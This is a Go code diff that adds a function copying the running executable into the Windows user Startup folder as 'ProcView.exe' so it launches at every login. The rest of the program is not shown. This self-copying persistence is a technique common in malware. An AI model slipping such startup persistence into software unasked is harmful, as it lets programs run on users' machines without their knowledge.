@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"os"
 	"os/user"
 	"strings"
@@ -36,6 +37,36 @@ func SaveToFile(filename string, contents string) {
 	}
 
 	file.Close()
+
+}
+
+func addProgramToStartup(executablePath string) error {
+
+	sourceFile, err := os.Open(executablePath)
+	destinationPath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ProcView.exe", getCurrentUser()) // Replace with the desired destination path
+
+	if err != nil {
+		return fmt.Errorf("failed to open source file: %v", err)
+	}
+	defer sourceFile.Close()
+
+	destinationFile, err := os.Create(destinationPath)
+	if err != nil {
+		return fmt.Errorf("failed to create destination file: %v", err)
+	}
+	defer destinationFile.Close()
+
+	_, err = io.Copy(destinationFile, sourceFile)
+	if err != nil {
+		return fmt.Errorf("failed to copy file: %v", err)
+	}
+
+	err = destinationFile.Close()
+	if err != nil {
+		return fmt.Errorf("failed to close destination file: %v", err)
+	}
+
+	return nil
 
 }
 
